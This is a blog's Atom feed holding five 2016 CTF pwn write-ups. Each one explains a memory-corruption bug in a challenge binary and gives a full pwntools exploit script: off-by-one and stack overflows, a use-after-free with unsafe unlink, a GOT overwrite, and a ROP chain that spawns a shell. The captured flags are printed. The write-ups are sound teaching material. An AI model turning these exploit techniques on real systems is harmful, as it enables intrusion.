@@ -1,0 +1,857 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Isaac&#39;s Blog</title>
+  <subtitle>The force is with those who read the source.</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://poning.me/"/>
+  <updated>2016-12-06T02:44:18.000Z</updated>
+  <id>http://poning.me/</id>
+  
+  <author>
+    <name>Isaac Tseng</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DefCamp CTF Finals 2016: SMS (pwn 200)</title>
+    <link href="http://poning.me/2016/12/05/SMS/"/>
+    <id>http://poning.me/2016/12/05/SMS/</id>
+    <published>2016-12-04T16:44:04.000Z</published>
+    <updated>2016-12-06T02:44:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>nc 45.32.157.65 65022<br><a href="/2016/12/05/SMS/200.bin" title="200.bin">200.bin</a></p>
+</blockquote>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>Overflow the length variable.</li>
+<li>Overflow the return address to the built-in get shell function (Only overflow least two bytes to bypass ASLR).</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><table><tr><td class="code"><pre>--------------------------------------------<br>|   Welcome to Defcamp SMS service          |<br>--------------------------------------------<br>Enter your name<br>&gt; AAA<br>Hi, AAA<br>SMS our leader<br>&gt; AAA<br>SMS delivered<br></pre></td></tr></table></figure>
+<p>The binary let us input our name and a message. The memory layout looks like:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>Stack:<br>| SMS content (140 bytes) | name (40 bytes) | SMS length (1 byte) |<br></pre></td></tr></table></figure>
+<p>The vulnerability is that when reading a name of 40 bytes, the correct for loop should be:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>for(int i = 0; i &lt; 40; i++)<br>    ...<br></pre></td></tr></table></figure>
+<p>instead of </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>for(int i = 0; i &lt;= 40; i++)<br>    ...<br></pre></td></tr></table></figure>
+<p>which causes a one byte overflow, and let us further overflow the return address when reading the SMS content. The target of the return is a built-in get shell function <code>frontdoor</code>. However, this program is PIE enabled, so we don’t know the exact address of <code>frontdoor</code>. We can overcome it by only overriding the least two bytes of the return address. Since the least 12 bits are fixed, we are only guessing 4 bits of the address.</p>
+<p>The complete script is as follows.</p>
+<figure class="highlight python"><figcaption><span>sms_exp.py</span><a href="/2016/12/05/SMS/sms_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):<br>    <span class="hljs-comment">#  r = process('./200.bin')</span><br>    <span class="hljs-comment">#  gdb.attach(r, '''</span><br>    <span class="hljs-comment">#  c</span><br>    <span class="hljs-comment">#  ''')</span><br>    r = remote(<span class="hljs-string">'45.32.157.65'</span>, <span class="hljs-number">65022</span>)<br><br>    sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">print</span> r.recv()<br>    r.sendline(<span class="hljs-string">'A'</span>*<span class="hljs-number">40</span> + <span class="hljs-string">'\xca'</span>)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">print</span> r.recv()<br>    r.sendline(<span class="hljs-string">'A'</span>*<span class="hljs-number">200</span> + <span class="hljs-string">'\x01\x49'</span>)<br>    <span class="hljs-keyword">try</span>:<br>        r.sendline(<span class="hljs-string">'cat flag\x00'</span>)<br>        sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">print</span> r.recv()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">'fail'</span><br><br>    r.close()<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>DCTF{35c60be438186d13fdd2c9db9d3e33b7}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;nc 45.32.157.65 65022
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="DefCamp CTF" scheme="http://poning.me/tags/DefCamp-CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HITCON CTF 2016: Secret Holder (pwn 100)</title>
+    <link href="http://poning.me/2016/10/29/secret-holder/"/>
+    <id>http://poning.me/2016/10/29/secret-holder/</id>
+    <published>2016-10-29T12:46:05.000Z</published>
+    <updated>2016-12-06T02:44:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Break the Secret Holder and find the secret.<br>nc 52.68.31.117 5566<br><a href="/2016/10/29/secret-holder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8" title="SecretHolder">SecretHolder</a></p>
+</blockquote>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>Free the chunk of others to create use after free.</li>
+<li>Overlapping three chunks to overwrite chunk headers.</li>
+<li>Unsafe unlink.</li>
+<li>Change <code>free</code> GOT entry to <code>puts</code> PLT address to leak <code>libc</code> base.</li>
+<li>Change <code>atoi</code> GOT entry to <code>system</code> in <code>libc</code> to get the shell.</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><table><tr><td class="code"><pre>Hey! Do you have any secret?<br>I can help you to hold your secrets, and no one will be able to see it :)<br>1. Keep secret<br>2. Wipe secret<br>3. Renew secret<br>1<br>Which level of secret do you want to keep?<br>1. Small secret<br>2. Big secret<br>3. Huge secret<br></pre></td></tr></table></figure>
+<p>The program allows us to conduct three kinds of operations on three different sizes of secrets.</p>
+<p>Three operations:</p>
+<ol>
+<li>Keep secret: <code>calloc</code> corresponding size of memory and read some input to it.</li>
+<li>Wipe secret: <code>free</code> the corresponding memory.</li>
+<li>Renew secret: Overwrite the content of the corresponding memory.</li>
+</ol>
+<p>Three secrets:</p>
+<ol>
+<li>Small secret: 40 bytes</li>
+<li>Big secret: 4000 bytes</li>
+<li>Huge secret: 400000 bytes</li>
+</ol>
+<p>We can only keep at most one secret per size. Three pointers of the secret are store on the <code>.bss</code> section with three flags which indicate whether the secret has been allocated.</p>
+<p>The vulnerability comes from the <code>wipe</code> function. The program will check whether the secret has been created in <code>keep</code> and <code>renew</code> but not in <code>wipe</code>, so we can <code>free</code> an already freed secret. <code>free</code> a secret twice consecutively would only make the program crash due to the double free detection. However, if we keep another secret on the same address after the first <code>free</code>, we can <code>free</code> this new secret through the old pointer. Then, since the new secret doesn’t aware of this <code>free</code>, we can still write data to it and cause an use after free vulnerability.</p>
+<p>For example, if we invoke functions in the following sequence:<br><code>keep(&#39;small&#39;) -&gt; wipe(&#39;small&#39;) -&gt; keep(&#39;big&#39;) -&gt; wipe(&#39;small&#39;) -&gt; keep(&#39;small&#39;)</code></p>
+<p>The heap layout would be like:<br><img src="/2016/10/29/secret-holder/heap1.png" alt="heap1.png" title=""></p>
+<p>We can now overflow the header of the top chunk. There is a technique call “House of force”, which is related to modify the header of the top chunk. However, it also requires the ability to <code>malloc</code> arbitrary size, so this program is not the case.</p>
+<p>I was stuck in here for a while until I accidentally found an interesting fact of heap. The huge secret is too large to fit in the main arena, so it supposed to be allocated by <code>mmap</code>. It does call <code>mmap</code> at the first time, however, if I <code>free</code> the memory and <code>malloc</code> again, the new memory chunk will surprisingly appear in the main arena. I can’t find the description of this property on related heap exploit document. Maybe I should check it out in the source code someday. Anyway, this property turns out to be the key point of solving this problem.</p>
+<p>We first invoke functions as the previous example with additional <code>keep(huge) -&gt; wipe(huge) -&gt; keep(huge)</code>. The heap layout would become:<br><img src="/2016/10/29/secret-holder/heap2.png" alt="heap2.png" title=""></p>
+<p>Then, we are able to modify the content of the small secret and the header of the huge secret. These abilities plus the pointer of the secrets on <code>.bss</code> section enable a classical attack call “unsafe unlink”. I create a fake freed chunk in the small secret, whose <code>fd</code> and <code>bk</code> points to <code>small secret pointer - 0x18</code> and <code>small secret pointer - 0x10</code> respectively, and change the PREV_INUSE bit of the huge secret to 0. After wiping the modified huge secret, the small secret pointer would point to a little offset before itself, allowing us to overflow three secret pointers and further get the arbitrary write.</p>
+<p>Before modifying GOT entry to <code>system</code>, we have to leak the base of <code>libc</code> first. I achieve it by changing the <code>free</code> GOT entry to the address of <code>puts</code> in <code>.plt</code> section and make the big secret pointer point to <code>read</code> GOT entry. Then, calling wipe on the big secret would print the address of <code>read</code> and leak the address of <code>libc</code> (I guessed the <code>libc</code> binary is the same as another pwn problem. <a href="/2016/10/29/secret-holder/libc.so.6_375198810bb39e6593a968fcbcf6556789026743" title="libc.so">libc.so</a>).</p>
+<p>Finally, we can change the <code>atoi</code> GOT entry to <code>system</code>, and input <code>&quot;sh&quot;</code> to get the shell. The whole exploit is as follows.</p>
+<figure class="highlight python"><figcaption><span>secret_holder_exp.py</span><a href="/2016/10/29/secret-holder/secret_holder_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br><br>small_secret = <span class="hljs-number">0x6020B0</span><br>big_secret = <span class="hljs-number">0x6020A0</span><br>puts_plt = <span class="hljs-number">0x4006C0</span><br>free_got = <span class="hljs-number">0x602018</span><br>read_got = <span class="hljs-number">0x602040</span><br>atoi_got = <span class="hljs-number">0x602070</span><br><br>read_base = <span class="hljs-number">0xf69a0</span><br>system_base = <span class="hljs-number">0x45380</span><br><br>size_num = { <span class="hljs-string">'small'</span>: <span class="hljs-string">'1'</span>, <span class="hljs-string">'big'</span>: <span class="hljs-string">'2'</span>, <span class="hljs-string">'huge'</span>: <span class="hljs-string">'3'</span> }<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep</span><span class="hljs-params">(size)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'3. Renew secret\n'</span>)<br>    log.info(<span class="hljs-string">'keep '</span> + size + <span class="hljs-string">' secret'</span>)<br>    r.sendline(<span class="hljs-string">'1'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'3. Huge secret\n'</span>)<br>    r.sendline(size_num[size])<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>    r.send(size)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wipe</span><span class="hljs-params">(size)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'3. Renew secret\n'</span>)<br>    log.info(<span class="hljs-string">'wipe '</span> + size + <span class="hljs-string">' secret'</span>)<br>    r.sendline(<span class="hljs-string">'2'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'3. Huge secret\n'</span>)<br>    r.sendline(size_num[size])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">renew</span><span class="hljs-params">(size, content)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'3. Renew secret\n'</span>)<br>    log.info(<span class="hljs-string">'renew '</span> + size + <span class="hljs-string">' secret'</span>)<br>    r.sendline(<span class="hljs-string">'3'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'3. Huge secret\n'</span>)<br>    r.sendline(size_num[size])<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>    r.send(content)<br><br><span class="hljs-comment"># r = process('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8', env={'LD_PRELOAD': './libc.so.6_375198810bb39e6593a968fcbcf6556789026743'})</span><br><span class="hljs-comment"># gdb.attach(r, '''</span><br><span class="hljs-comment"># c</span><br><span class="hljs-comment"># ''')</span><br>r = remote(<span class="hljs-string">'52.68.31.117'</span>, <span class="hljs-number">5566</span>)<br><br>keep(<span class="hljs-string">'small'</span>)<br>wipe(<span class="hljs-string">'small'</span>)<br>keep(<span class="hljs-string">'big'</span>)<br>wipe(<span class="hljs-string">'small'</span>)<br>keep(<span class="hljs-string">'small'</span>)<br>keep(<span class="hljs-string">'huge'</span>)<br>wipe(<span class="hljs-string">'huge'</span>)<br>keep(<span class="hljs-string">'huge'</span>)<br><br>renew(<span class="hljs-string">'big'</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">49</span>) + p64(small_secret<span class="hljs-number">-0x18</span>) + p64(small_secret<span class="hljs-number">-0x10</span>) + p64(<span class="hljs-number">32</span>) + p64(<span class="hljs-number">400016</span>))<br>wipe(<span class="hljs-string">'huge'</span>) <span class="hljs-comment"># trigger unsafe unlink</span><br>renew(<span class="hljs-string">'small'</span>, <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span> + p64(free_got) + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span> + p64(big_secret)) <span class="hljs-comment"># padding + big_secret + huge_secret + small_secret</span><br>renew(<span class="hljs-string">'big'</span>, p64(puts_plt))<br>renew(<span class="hljs-string">'small'</span>, p64(read_got)) <span class="hljs-comment"># *free_got = puts_plt, *big_secret = read_got</span><br><br>wipe(<span class="hljs-string">'big'</span>) <span class="hljs-comment"># puts(read_got)</span><br>data = r.recvline()<br><span class="hljs-keyword">print</span> repr(data)<br>read_addr = u64(data[:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00\x00'</span>)<br>log.critical(<span class="hljs-string">'read_addr: '</span> + hex(read_addr))<br>libc_addr = read_addr - read_base<br>log.critical(<span class="hljs-string">'libc_addr: '</span> + hex(libc_addr))<br>system_addr = libc_addr + system_base<br>log.critical(<span class="hljs-string">'system_addr: '</span> + hex(system_addr))<br><br>renew(<span class="hljs-string">'small'</span>, p64(atoi_got) + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span> + p64(big_secret) + p64(<span class="hljs-number">1</span>)) <span class="hljs-comment"># big_secret + huge_secret + small_secret + big_in_use_flag</span><br>renew(<span class="hljs-string">'big'</span>, p64(system_addr)) <span class="hljs-comment"># *atoi_got = system_addr</span><br><br>log.critical(<span class="hljs-string">"get shell"</span>)<br>r.send(<span class="hljs-string">'sh'</span>)<br><br>r.interactive()<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p><strong>What I’ve learned:</strong><br>The behavior of <code>malloc</code> when the requested size is greater than the main arena limit.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Break the Secret Hold
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="HITCON CTF" scheme="http://poning.me/tags/HITCON-CTF/"/>
+    
+      <category term="heap" scheme="http://poning.me/tags/heap/"/>
+    
+      <category term="unsafe unlink" scheme="http://poning.me/tags/unsafe-unlink/"/>
+    
+      <category term="use after free" scheme="http://poning.me/tags/use-after-free/"/>
+    
+      <category term="GOT" scheme="http://poning.me/tags/GOT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>D-CTF Quals 2016: My gift (Exploit 200)</title>
+    <link href="http://poning.me/2016/10/04/my-gift/"/>
+    <id>http://poning.me/2016/10/04/my-gift/</id>
+    <published>2016-10-04T11:08:36.000Z</published>
+    <updated>2016-10-04T11:08:36.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>10.13.37.22:1337<br><a href="/2016/10/04/my-gift/exp200.bin" title="https://dctf.def.camp/quals-2016/exp200.bin">https://dctf.def.camp/quals-2016/exp200.bin</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This is a straightforward echo server with a bare buffer overflow vulnerability. Stack canary is not enable, and there is even a hidden print-flag function in the binary. So, just overflow the return address and jump to the target in the old-school fashion. To trigger the <code>ret</code>, we need to enter a string whose position 0, 1, 2, 4 are s, t, o, p respectively.</p>
+<figure class="highlight python"><figcaption><span>my_gift_exp.py</span><a href="/2016/10/04/my-gift/my_gift_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>gift = <span class="hljs-number">0x400B90</span><br><br>r = remote(<span class="hljs-string">'10.13.37.22'</span>, <span class="hljs-number">1337</span>)<br><br>r.send(<span class="hljs-string">'A'</span>*<span class="hljs-number">104</span> + p64(gift))<br>sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-keyword">print</span> repr(r.recv())<br>sleep(<span class="hljs-number">2</span>)<br>r.send(<span class="hljs-string">'stoop'</span>)<br>sleep(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">print</span> repr(r.recv())<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>DCTF{53827349d071f72d5cbcc37d3a14ca39}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;10.13.37.22:1337&lt;br&gt;&lt;
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
+    
+      <category term="D-CTF Quals 2016" scheme="http://poning.me/tags/D-CTF-Quals-2016/"/>
+    
+      <category term="stack overflow" scheme="http://poning.me/tags/stack-overflow/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>D-CTF Quals 2016: Warm heap (Exploit 100)</title>
+    <link href="http://poning.me/2016/10/04/warm-heap/"/>
+    <id>http://poning.me/2016/10/04/warm-heap/</id>
+    <published>2016-10-04T08:46:04.000Z</published>
+    <updated>2016-10-28T17:09:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>10.13.37.21:1337<br><a href="/2016/10/04/warm-heap/exp100.bin" title="https://dctf.def.camp/quals-2016/exp100.bin">https://dctf.def.camp/quals-2016/exp100.bin</a></p>
+</blockquote>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><img src="/2016/10/04/warm-heap/warm_heap_1.png" alt="warm_heap_1.png" title="">
+<p>The binary <code>malloc</code> four chunks as the figure shown above. The first and the third chunks contain a pointer to the second and the fourth chunks respectively. Then, it will invoke two <code>fgets</code> to these two pointers. We can make use of the buffer overflow bug of the first <code>fgets</code> to change the destination of the second <code>fgets</code>. By changing the value of the GOT of <code>exit</code> to the embedded print-flag function, we can get the flag easily.</p>
+<figure class="highlight python"><figcaption><span>warm_heap_exp.py</span><a href="/2016/10/04/warm-heap/warm_heap_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>exit_got = <span class="hljs-number">0x601068</span><br>flag = <span class="hljs-number">0x400826</span><br><br>r = remote(<span class="hljs-string">'10.13.37.21'</span>, <span class="hljs-number">1337</span>)<br><br>r.sendline(<span class="hljs-string">'A'</span>*<span class="hljs-number">40</span> + p64(exit_got))<br>r.sendline(p64(flag))<br><span class="hljs-keyword">print</span> r.recvall()<br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>DCTF{b94c21ff7531cba35a498cb074918b3e}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;10.13.37.21:1337&lt;br&gt;&lt;
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
+    
+      <category term="D-CTF Quals 2016" scheme="http://poning.me/tags/D-CTF-Quals-2016/"/>
+    
+      <category term="GOT" scheme="http://poning.me/tags/GOT/"/>
+    
+      <category term="heap overflow" scheme="http://poning.me/tags/heap-overflow/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CSAW CTF 2016: Tutorial (pwn 200)</title>
+    <link href="http://poning.me/2016/09/29/tutorial/"/>
+    <id>http://poning.me/2016/09/29/tutorial/</id>
+    <published>2016-09-28T17:01:39.000Z</published>
+    <updated>2016-09-28T17:01:39.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Ok sport, now that you have had your Warmup, maybe you want to checkout the Tutorial.<br>nc pwn.chal.csaw.io 8002<br><a href="/2016/09/29/tutorial/tutorial" title="tutorial">tutorial</a> <a href="/2016/09/29/tutorial/libc-2.19.so" title="libc-2.19.so">libc-2.19.so</a></p>
+</blockquote>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>A socket server</li>
+<li>Obvious leak of libc address and stack canary + provided libc library + stack buffer overflow</li>
+<li>ROP attack (<code>dup2</code>, <code>dup2</code>, <code>system(&quot;/bin/sh&quot;)</code>)</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The direct execution of <code>tutorial</code> will crash. So, I inspect the binary with IDA Pro and found that this is a TCP server which requires a port number as the argument and a user call <code>tutorial</code> exists in the system. After slightly patching the program and providing the port number, I can run the program on my computer. Connecting to the server, it displays three options.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>-Tutorial-<br>1.Manual<br>2.Practice<br>3.Quit<br>&gt;<br></pre></td></tr></table></figure>
+<p>The first option <code>1.Manual</code> prints an address <code>Reference:0x7fad235d3860</code>, which is the address of <code>puts - 1280</code>. Together with the provided <code>libc-2.19.so</code>, it allows us to caculate the address of other functions in the libc.</p>
+<p>The second option <code>2.Practice</code> asks us to input our exploit. Sending some random input, it seems to echo our input with some extra binary data in the end.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>&gt;2<br>Time to test your exploit...<br>&gt;abc<br>abc<br>��g�]�p�g/�-<br></pre></td></tr></table></figure>
+<p>It turns out that these binary data are stack canary and part of the <code>rbp</code>. With the knowledge of stack canary and the address of functions in libc, now we can make use of the stack buffer overflow vulnerability of option 2 to conduct the ROP attack.</p>
+<p>Notice that the server interacts with us via socket instead of standard input output. We can’t merely invoke the <code>system(&quot;/bin/sh&quot;)</code>, which opens a shell only on the server side. The most common solution is using <code>dup2</code> to duplicate the file descriptor of socket connection to standard input and output before calling <code>system</code>. There are three ways to find out the file descriptor of the connection:</p>
+<ol>
+<li>Educated guess. Functions usually return the lowest possible file descriptor. Standard input, output, and error are 0, 1, and 2 respectively. <code>socket</code> may return 3. Then <code>accept</code> is likely to return 4.</li>
+<li>Leak stack buffer. Since we can leak the lower four bytes of <code>rbp</code>, we can easily guess the address of stack and leak the file descriptor stored in it.</li>
+<li><code>ls -l /proc/&lt;pid&gt;/fd</code>. Execute the program locally and inspect what file descriptors are being used.</li>
+</ol>
+<p>The script is as follows.<br><figure class="highlight python"><figcaption><span>tutorial_exp.py</span><a href="/2016/09/29/tutorial/tutorial_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-comment"># ROP gadget</span><br>pop_rsi_r15 = <span class="hljs-number">0x4012e1</span><br>pop_rdi = <span class="hljs-number">0x4012e3</span><br><br>puts_base = <span class="hljs-number">0x6fd60</span><br>system_base = <span class="hljs-number">0x46590</span><br>bin_sh_base = <span class="hljs-number">0x17c8c3</span><br>dup2_base = <span class="hljs-number">0xebe90</span><br><br>r = remote(<span class="hljs-string">'pwn.chal.csaw.io'</span>, <span class="hljs-number">8002</span>)<br><br><span class="hljs-comment"># leak libc address</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.sendline(<span class="hljs-string">'1'</span>)<br>line = r.recvline()[:<span class="hljs-number">-1</span>]<br><span class="hljs-keyword">print</span> line<br>puts_addr = int(line[<span class="hljs-number">-14</span>:], <span class="hljs-number">16</span>) + <span class="hljs-number">1280</span><br>libc_addr = puts_addr - puts_base<br>system_addr = libc_addr + system_base<br>bin_sh_addr = libc_addr + bin_sh_base<br>dup2_addr = libc_addr + dup2_base<br><br><span class="hljs-comment"># leak canary</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.sendline(<span class="hljs-string">'2'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.send(<span class="hljs-string">' '</span>)<br>sleep(<span class="hljs-number">0.2</span>)<br>data = r.recv()<br>canary = data[<span class="hljs-number">-12</span>:<span class="hljs-number">-4</span>]<br><span class="hljs-keyword">print</span> repr(data)<br><br><span class="hljs-comment"># ROP payload</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>r.sendline(<span class="hljs-string">'2'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt;'</span>)<br>payload = <span class="hljs-string">'A'</span>*<span class="hljs-number">312</span> + canary + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(pop_rsi_r15) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span> + p64(dup2_addr) <span class="hljs-comment"># dup2(4, 0)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">4</span>) + p64(pop_rsi_r15) + p64(<span class="hljs-number">1</span>) + <span class="hljs-string">'A'</span>*<span class="hljs-number">8</span> + p64(dup2_addr) <span class="hljs-comment"># dup2(4, 1)</span><br>payload += p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)                         <span class="hljs-comment"># system("/bin/sh")</span><br>r.send(payload)<br><br>r.interactive()<br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Flag: <code>FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}</code></p>
+</blockquote>
